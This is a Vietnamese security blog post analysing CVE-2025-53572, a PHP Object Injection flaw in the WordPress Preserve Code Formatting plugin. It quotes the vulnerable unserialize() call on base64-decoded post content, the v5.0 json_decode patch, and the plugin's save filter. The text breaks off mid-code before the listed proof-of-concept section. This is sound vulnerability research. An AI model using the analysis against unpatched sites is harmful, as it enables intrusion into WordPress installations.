<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-53572 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Preserve Code Formatting Plugin."><meta name="keywords" content='analyst, plugin, php object injection'>
  <meta itemprop="name" content="CVE-2025-53572 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Preserve Code Formatting Plugin.">
  <meta itemprop="datePublished" content="2025-11-20T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
  <meta itemprop="wordCount" content="1291">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Php Object Injection"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-53572 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Preserve Code Formatting Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-20T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-25T21:12:53+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Php Object Injection">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png">
  <meta name="twitter:title" content="CVE-2025-53572 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Preserve Code Formatting Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/index.md" title="CVE-2025-53572 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-53572 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-20-cve-2025-49386\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, php object injection","wordcount":  1291 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-20-cve-2025-49386\/","datePublished": "2025-11-20T19:00:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Preserve Code Formatting Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-20-cve-2025-49386/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-20-cve-2025-49386/">English</option><option value="/vi/posts/2025-11-20-cve-2025-49386/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC">CVE-2025-6742 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-18-cve-2025-53572/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-17-cve-2025-49401/" title="CVE-2025-49401 Analysis &amp; POC">CVE-2025-49401 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-14-cve-2025-9083/" title="CVE-2025-9083 Analysis &amp; POC">CVE-2025-9083 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-53572 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-20 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-20">2025-11-20</time></span>&nbsp;<span title="Cập nhật ngày 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="1291 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 1300 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-20-cve-2025-49386/app.png' alt="/posts/2025-11-20-cve-2025-49386/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng <strong>Deserialization of Untrusted Data</strong> trong Scott Reilly <strong>Preserve Code Formatting</strong> <em>preserve-code-formatting</em> cho phép <strong>Object Injection</strong>. Vấn đề này ảnh hưởng đến <strong>Preserve Code Formatting</strong>: từ <code>n/a</code> đến &lt;= <code>4.0.1</code>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-53572"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-53572</a></li>
<li><strong>Vulnerability Type</strong>: PHP Object Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 4.0.1</li>
<li><strong>Patched Versions</strong>: 5.0</li>
<li><strong>CVSS severity</strong>: High (8.8)</li>
<li><strong>Required Privilege</strong>: Contributor</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/preserve-code-formatting/"target="_blank" rel="external nofollow noopener noreferrer">WordPress Preserve Code Formatting Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>Preserve Code Formatting</strong>:
<ul>
<li><code>4.0.1</code> – <strong>vulnerable</strong></li>
<li><code>5.0</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>Trong phiên bản lỗi (v4.0.1):</strong></p>
<div class="highlight" title="preserve-code-formatting.php v4.0.1"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">chunk_split_token</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nx">base64_decode</span><span class="p">(</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Trong đoạn mã này, hàm <strong><code>unserialize()</code></strong> được gọi trực tiếp trên dữ liệu người dùng (<code>$match[2]</code> sau khi giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:</p>
<ul>
<li><strong>Nguy cơ Object Injection</strong>: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến <strong>Object Injection</strong> và có khả năng tiến tới <strong>Remote Code Execution (RCE)</strong>.</li>
<li><strong>Thiếu kiểm tra an toàn</strong>: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.</li>
<li><strong>Không có cơ chế fallback</strong>: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.</li>
</ul>
<p><strong>Bản vá (v5.0):</strong></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-20-cve-2025-49386/diff.png" title="Sự thay đổi của bản vá" data-thumbnail="/posts/2025-11-20-cve-2025-49386/diff.png" data-sub-html="<h2>Diff</h2><p>Sự thay đổi của bản vá</p>"><img loading="lazy" src='/posts/2025-11-20-cve-2025-49386/diff.png' alt="Diff" height="798" width="1919"></a><figcaption class="image-caption">Sự thay đổi của bản vá</figcaption>
  </figure></p>
<p>Thay thế <code>unserialize()</code> bằng <code>json_decode()</code>:</p>
<div class="highlight" title="preserve-code-formatting.php v5.0"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$decoded_data</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">chunk_split_token</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">stripslashes</span><span class="p">(</span> <span class="nx">base64_decode</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_content_safe</span><span class="p">(</span> <span class="nv">$decoded_data</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span> <span class="nv">$decoded_data</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nv">$data</span> <span class="o">===</span> <span class="k">null</span> <span class="o">&amp;&amp;</span> <span class="nx">json_last_error</span><span class="p">()</span> <span class="o">!==</span> <span class="nx">JSON_ERROR_NONE</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$decoded_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Không còn dùng <code>unserialize()</code> → loại bỏ hoàn toàn khả năng <code>PHP Object Injection</code>.</p>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký một filter:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_filter</span><span class="p">(</span> <span class="s1">&#39;content_save_pre&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;preserve_postprocess&#39;</span> <span class="p">),</span> <span class="mi">100</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hook <code>content_save_pre</code>: được gọi trước khi nội dung bài viết được lưu vào cơ sở dữ liệu. Đây là thời điểm thích hợp để can thiệp, chỉnh sửa hoặc lọc nội dung.</p>
<p>Khi filter được kích hoạt thì callback <code>preserve_postprocess</code> được gọi:</p>
<div class="highlight" title="preserve-code-formatting.php v4.0.1" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="lnt">14
</span><span class="lnt">15
</span><span class="hl"><span class="lnt">16
</span></span><span class="lnt">17
</span><span class="lnt">18
</span><span class="hl"><span class="lnt">19
</span></span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">preserve_postprocess</span><span class="p">(</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$preserve</span> <span class="o">=</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$options</span>                    <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_options</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$preserve_tags</span>              <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;preserve_tags&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wrap_multiline_code_in_pre</span> <span class="o">=</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span>  <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;wrap_multiline_code_in_pre&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span>                     <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$preserve_tags</span> <span class="k">as</span> <span class="nv">$tag</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$result</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">        <span class="nv">$codes</span> <span class="o">=</span> <span class="nx">preg_split</span><span class="p">(</span> <span class="s2">&#34;/(</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="s2">[^</span><span class="se">\\</span><span class="s2">]]*</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">}.*</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">{</span><span class="se">\\</span><span class="s2">/</span><span class="si">{</span><span class="nv">$tag</span><span class="si">}</span><span class="se">\\</span><span class="s2">}</span><span class="se">\\</span><span class="s2">!</span><span class="se">\\</span><span class="s2">})/Us&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">PREG_SPLIT_DELIM_CAPTURE</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$codes</span> <span class="k">as</span> <span class="nv">$code</span> <span class="p">)</span> <span class="p">{</span>
